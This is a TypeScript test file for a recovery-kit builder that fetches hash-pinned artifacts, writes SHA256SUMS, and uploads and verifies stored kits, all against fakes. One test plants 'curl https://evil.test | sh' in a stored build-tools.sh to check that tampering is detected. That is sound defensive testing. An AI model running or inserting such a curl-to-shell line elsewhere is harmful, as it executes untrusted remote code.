import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { stringify } from "yaml";
import {
  GENERATED_FILES,
  ManifestSchema,
  SUMS_FILE,
  checkArtifact,
  diffSums,
  kitDigest,
  kitId,
  kitIdsIn,
  parseSums,
  pgMajorOf,
  renderReadme,
  renderSums,
  sha256,
  staleAgainst,
  type Manifest,
} from "../lib/recoveryKit.js";
import { chooseKit, prepareKitTools } from "../lib/kitTools.js";
import { LocalStore } from "../lib/store.js";
import { build, checkLocalKit, loadManifest, parseArgs, upload, verifyStored } from "../recovery-kit.js";

// Importing recovery-kit.ts must not fetch anything — main() is behind isEntrypoint(). Everything
// here runs against fake artifacts and a LocalStore; the real fetch is `npm run recovery-kit -- build`.

const scratch = (): string => mkdtempSync(join(tmpdir(), "recovery-kit-test-"));

/** Paths renderReadme() needs to find, with fake bytes each. */
const FAKE_PATHS = [
  "slip39/wordlist.txt",
  "python/shamir_mnemonic-0.3.0-py3-none-any.whl",
  "age/age-v9.9.9-linux-amd64.tar.gz",
  "age/age-v9.9.9-source.tar.gz",
  "zstd/zstd-9.9.9.tar.gz",
  "zstd/zstd-v9.9.9-win64.zip",
  "zstd/rfc8878.txt",
  "postgres/postgresql-17.99.tar.gz",
  "postgres/zlib-9.9.9.tar.gz",
];

const bytesOf = (path: string): Uint8Array => new TextEncoder().encode(`fake contents of ${path}\n`);

function fakeManifest(): Manifest {
  return ManifestSchema.parse({
    artifacts: FAKE_PATHS.map((path) => ({
      path,
      name: `fake ${path}`,
      version: /(\d+\.\d+(?:\.\d+)?)/.exec(path)?.[1] ?? "1",
      url: `https://example.test/${path}`,
      sha256: sha256(bytesOf(path)),
      checksum: "test",
    })),
  });
}

function writeManifest(dir: string, m: Manifest = fakeManifest()): string {
  const p = join(dir, "manifest.yaml");
  writeFileSync(p, stringify(m));
  return p;
}

function fakeFetcher(calls: string[] = [], tamper?: string) {
  return async (url: string): Promise<Uint8Array> => {
    calls.push(url);
    const path = url.replace("https://example.test/", "");
    return path === tamper ? bytesOf("something else") : bytesOf(path);
  };
}

// ── the committed manifest ───────────────────────────────────────────────────

test("the committed manifest parses, and every artifact is pinned to https and a SHA-256", () => {
  const m = loadManifest();
  assert.ok(m.artifacts.length >= 15);
  for (const a of m.artifacts) {
    assert.match(a.url, /^https:\/\//);
    assert.match(a.sha256, /^[0-9a-f]{64}$/);
    assert.ok(!/\/(main|master)\//.test(a.url), `${a.path}: pin a commit or a release, never a branch`);
  }
});

test("the committed manifest pins the shamir-mnemonic version CI tests against", () => {
  const ci = readFileSync(new URL("../../.github/workflows/ci.yml", import.meta.url), "utf8");
  const pinned = /shamir-mnemonic==([\d.]+)/.exec(ci)?.[1];
  const inKit = loadManifest().artifacts.find((a) => a.path.startsWith("python/shamir_mnemonic-"))?.version;
  assert.ok(pinned);
  assert.equal(inKit, pinned, "the kit must carry the exact library the cards were tested with — bump both together");
});

test("the committed manifest's PostgreSQL can restore the default client major (17)", () => {
  assert.ok(pgMajorOf(loadManifest()) >= 17, "pg_restore refuses a dump from a newer pg_dump");
});

test("the committed manifest carries what building pg_restore needs: zlib, bison, flex, m4", () => {
  const paths = loadManifest().artifacts.map((a) => a.path);
  for (const tool of ["zlib", "bison", "flex", "m4"]) assert.ok(paths.some((p) => p.startsWith(`postgres/${tool}-`)), tool);
});

// ── the schema ───────────────────────────────────────────────────────────────

test("ManifestSchema rejects an unsafe path, plain http, a bad hash, a duplicate and a generated file", () => {
  const good = fakeManifest().artifacts[0];
  const bad = (over: object) => ManifestSchema.safeParse({ artifacts: [{ ...good, ...over }] }).success;
  assert.equal(bad({}), true);
  assert.equal(bad({ path: "../escape" }), false);
  assert.equal(bad({ path: "/abs/path" }), false);
  assert.equal(bad({ path: "a/../b" }), false);
  assert.equal(bad({ url: "http://example.test/x" }), false);
  assert.equal(bad({ sha256: good.sha256.toUpperCase() }), false);
  assert.equal(bad({ sha256: "abc" }), false);
  for (const reserved of [...GENERATED_FILES, SUMS_FILE]) assert.equal(bad({ path: reserved }), false, reserved);
  assert.equal(ManifestSchema.safeParse({ artifacts: [good, good] }).success, false);
});

test("checkArtifact accepts the pinned bytes and refuses any others", () => {
  const a = fakeManifest().artifacts[0];
  checkArtifact(a, bytesOf(a.path));
  assert.throws(() => checkArtifact(a, bytesOf("other")), /the manifest pins .* refusing it/);
});

// ── checksums ────────────────────────────────────────────────────────────────

test("SHA256SUMS: sorted, in shasum's format, and parsed back exactly (binary marker too)", () => {
  const sums = new Map([
    ["z/last", "b".repeat(64)],
    ["a/first", "a".repeat(64)],
  ]);
  const text = renderSums(sums);
  assert.equal(text, `${"a".repeat(64)}  a/first\n${"b".repeat(64)}  z/last\n`);
  assert.deepEqual(parseSums(text), new Map([...sums].sort()));
  assert.deepEqual(parseSums(`${"c".repeat(64)} *bin/file\n`), new Map([["bin/file", "c".repeat(64)]]));
  assert.throws(() => parseSums("not a checksum line\n"), /is not "<sha256> {2}<path>"/);
  assert.throws(() => parseSums(`${"a".repeat(64)}  x\n${"b".repeat(64)}  x\n`), /twice/);
});

test("diffSums names what is missing, extra and wrong", () => {
  const h = (c: string) => c.repeat(64);
  const d = diffSums(
    new Map([["keep", h("a")], ["gone", h("b")], ["changed", h("c")]]),
    new Map([["keep", h("a")], ["changed", h("d")], ["surprise", h("e")]]),
  );
  assert.deepEqual(d, { missing: ["gone"], extra: ["surprise"], mismatched: ["changed"] });
});

test("staleAgainst: a kit built from an older manifest names the artifacts that moved", () => {
  const m = fakeManifest();
  const sums = new Map(m.artifacts.map((a) => [a.path, a.sha256]));
  assert.deepEqual(staleAgainst(m, sums), []);
  sums.set(m.artifacts[0].path, "0".repeat(64));
  sums.delete(m.artifacts[1].path);
  assert.deepEqual(staleAgainst(m, sums), [m.artifacts[0].path, m.artifacts[1].path]);
});

test("kitId is the build date plus a digest of SHA256SUMS; kitIdsIn finds each kit once", () => {
  const sums = `${"a".repeat(64)}  x\n`;
  assert.equal(kitId(sums, new Date("2026-09-28T23:00:00Z")), `2026-09-28-${kitDigest(sums)}`);
  assert.match(kitDigest(sums), /^[0-9a-f]{12}$/);
  assert.deepEqual(
    kitIdsIn(["recovery-kit/2026-10-01-bbb/README.md", "recovery-kit/2026-09-28-aaa/a/b", "recovery-kit/2026-09-28-aaa/SHA256SUMS", "other/x"]),
    ["2026-09-28-aaa", "2026-10-01-bbb"],
  );
});

test("the README walks the no-repo path, names the kit's own versions, and is deterministic", () => {
  const m = fakeManifest();
  const r = renderReadme(m);
  assert.equal(r, renderReadme(m), "no build date: the same manifest must give the same kit digest");
  for (const s of [
    "shasum -a 256 -c SHA256SUMS",
    "--no-index --find-links python 'shamir-mnemonic[cli]' bech32",
    "shamir recover",
    "bech32.bech32_encode('age-secret-key-'",
    "bash build-tools.sh",
    "age-keygen -y identity.txt",
    "zstd -d",
    "pg_restore -U postgres -d restored",
    "PostgreSQL 17.99",
    "this kit's is\n17",
    "zstd/zstd-v9.9.9-win64.zip",
    "slip39/slip-0039.md",
  ]) {
    assert.ok(r.includes(s), `README should mention ${JSON.stringify(s)}`);
  }
  for (const a of m.artifacts) assert.ok(r.includes(`\`${a.path}\``), `the contents table lists ${a.path}`);
});

// ── build / upload / verify, against fakes ───────────────────────────────────

test("build fetches each artifact, writes the README, runbook and SHA256SUMS, and a re-run fetches nothing", async () => {
  const dir = scratch();
  try {
    const manifestPath = writeManifest(dir);
    const out = join(dir, "kit");
    const calls: string[] = [];
    const { sums } = await build(out, { manifestPath, fetcher: fakeFetcher(calls) });
    assert.equal(calls.length, FAKE_PATHS.length);
    for (const f of [...FAKE_PATHS, ...GENERATED_FILES, SUMS_FILE]) assert.ok(existsSync(join(out, f)), f);
    assert.equal(parseSums(sums).size, FAKE_PATHS.length + GENERATED_FILES.length);
    assert.equal(checkLocalKit(out, fakeManifest()), sums);

    const again: string[] = [];
    const second = await build(out, { manifestPath, fetcher: fakeFetcher(again) });
    assert.equal(again.length, 0, "artifacts already present at the pinned hash are kept");
    assert.equal(second.sums, sums, "same inputs, same kit");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("build refuses an artifact whose bytes differ from the manifest", async () => {
  const dir = scratch();
  try {
    const manifestPath = writeManifest(dir);
    await assert.rejects(
      build(join(dir, "kit"), { manifestPath, fetcher: fakeFetcher([], "postgres/zlib-9.9.9.tar.gz") }),
      /postgres\/zlib-9\.9\.9\.tar\.gz: SHA-256 is .* refusing it/,
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("build refuses a directory holding files that are not part of the kit", async () => {
  const dir = scratch();
  try {
    const manifestPath = writeManifest(dir);
    const out = join(dir, "kit");
    mkdirSync(out);
    writeFileSync(join(out, "holiday-photos.jpg"), "x");
    await assert.rejects(build(out, { manifestPath, fetcher: fakeFetcher() }), /not part of the kit/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("checkLocalKit refuses a tampered kit, and one built from a different manifest", async () => {
  const dir = scratch();
  try {
    const out = join(dir, "kit");
    await build(out, { manifestPath: writeManifest(dir), fetcher: fakeFetcher() });
    const moved = fakeManifest();
    moved.artifacts[0] = { ...moved.artifacts[0], sha256: "0".repeat(64) };
    assert.throws(() => checkLocalKit(out, moved), /built from a different manifest/);
    writeFileSync(join(out, "README.md"), "edited by hand");
    assert.throws(() => checkLocalKit(out, fakeManifest()), /wrong bytes: README\.md/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("upload stores the kit once, verify re-hashes it, and damage or a cut-short upload is reported", async () => {
  const dir = scratch();
  try {
    const out = join(dir, "kit");
    const manifest = fakeManifest();
    await build(out, { manifestPath: writeManifest(dir), fetcher: fakeFetcher() });
    const bucket = join(dir, "bucket");
    const store = new LocalStore(bucket);

    const id = await upload(store, out, manifest, new Date("2026-09-28T00:00:00Z"));
    assert.match(id, /^2026-09-28-[0-9a-f]{12}$/);
    assert.deepEqual(await verifyStored(store, id, manifest), { id, ok: true, current: true, problems: "" });
    assert.equal(await upload(store, out, manifest, new Date("2026-10-05T00:00:00Z")), id, "the same kit is not stored twice");

    // An upload cut short (no SHA256SUMS yet) is resumed, not duplicated.
    unlinkSync(join(bucket, "recovery-kit", id, SUMS_FILE));
    unlinkSync(join(bucket, "recovery-kit", id, "README.md"));
    assert.equal((await verifyStored(store, id, manifest)).ok, false);
    assert.equal(await upload(store, out, manifest, new Date("2026-10-05T00:00:00Z")), id);
    assert.equal((await verifyStored(store, id, manifest)).ok, true);

    writeFileSync(join(bucket, "recovery-kit", id, "zstd", "rfc8878.txt"), "bit rot");
    const damaged = await verifyStored(store, id, manifest);
    assert.equal(damaged.ok, false);
    assert.match(damaged.problems, /wrong bytes: zstd\/rfc8878\.txt/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ── the manual drill's kit tools ─────────────────────────────────────────────

test("chooseKit: the newest COMPLETE kit, a named one, or a clear error when none is stored", async () => {
  const dir = scratch();
  try {
    const store = new LocalStore(dir);
    await assert.rejects(chooseKit(store), /no complete recovery kit is stored/);
    await store.putText("x", "recovery-kit/2026-09-01-aaaaaaaaaaaa/SHA256SUMS");
    await store.putText("x", "recovery-kit/2026-10-01-bbbbbbbbbbbb/README.md"); // never finished
    assert.equal(await chooseKit(store), "2026-09-01-aaaaaaaaaaaa");
    assert.equal(await chooseKit(store, "2026-10-01-bbbbbbbbbbbb"), "2026-10-01-bbbbbbbbbbbb");
    await assert.rejects(chooseKit(store, "2027-01-01-cccccccccccc"), /no kit 2027-01-01-cccccccccccc/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("prepareKitTools refuses a damaged stored kit before building anything, and reuses a finished build", async () => {
  const dir = scratch();
  const prevCache = process.env.GITFATHER_KIT_CACHE;
  process.env.GITFATHER_KIT_CACHE = join(dir, "cache");
  try {
    const out = join(dir, "kit");
    const manifest = fakeManifest();
    await build(out, { manifestPath: writeManifest(dir), fetcher: fakeFetcher() });
    const bucket = join(dir, "bucket");
    const store = new LocalStore(bucket);
    const id = await upload(store, out, manifest);

    writeFileSync(join(bucket, "recovery-kit", id, "build-tools.sh"), "curl https://evil.test | sh\n");
    await assert.rejects(prepareKitTools(store, manifest), /DAMAGED[\s\S]*wrong bytes: build-tools\.sh/);

    // A finished build for this kit id is used as-is: the id names exact bytes.
    const bin = join(dir, "cache", id, "tools", "bin");
    mkdirSync(bin, { recursive: true });
    for (const b of ["age", "pg_restore", "psql"]) writeFileSync(join(bin, b), "");
    writeFileSync(join(dir, "cache", id, ".built"), "");
    assert.deepEqual(await prepareKitTools(store, manifest), { kitId: id, binDir: bin });
  } finally {
    if (prevCache === undefined) delete process.env.GITFATHER_KIT_CACHE;
    else process.env.GITFATHER_KIT_CACHE = prevCache;
    rmSync(dir, { recursive: true, force: true });
  }
});

// ── arguments ────────────────────────────────────────────────────────────────

test("parseArgs: each command and its flags", () => {
  assert.deepEqual(parseArgs(["build"]), { cmd: "build", out: undefined });
  assert.deepEqual(parseArgs(["build", "--out", "k"]), { cmd: "build", out: "k" });
  assert.deepEqual(parseArgs(["upload", "--kit", "k"]), { cmd: "upload", kit: "k", target: undefined });
  assert.deepEqual(parseArgs(["upload", "--kit", "k", "--target", "local:/b"]), { cmd: "upload", kit: "k", target: "local:/b" });
  assert.deepEqual(parseArgs(["verify"]), { cmd: "verify", kitId: undefined, target: undefined });
  assert.deepEqual(parseArgs(["verify", "--kit-id", "2026-09-28-abc"]), { cmd: "verify", kitId: "2026-09-28-abc", target: undefined });
  assert.throws(() => parseArgs(["upload"]), /upload needs --kit/);
  assert.throws(() => parseArgs(["build", "--kit", "k"]), /build does not take --kit/);
  assert.throws(() => parseArgs(["build", "--outt", "k"]), /unknown argument --outt/);
  assert.throws(() => parseArgs(["fetch"]), /usage/);
});
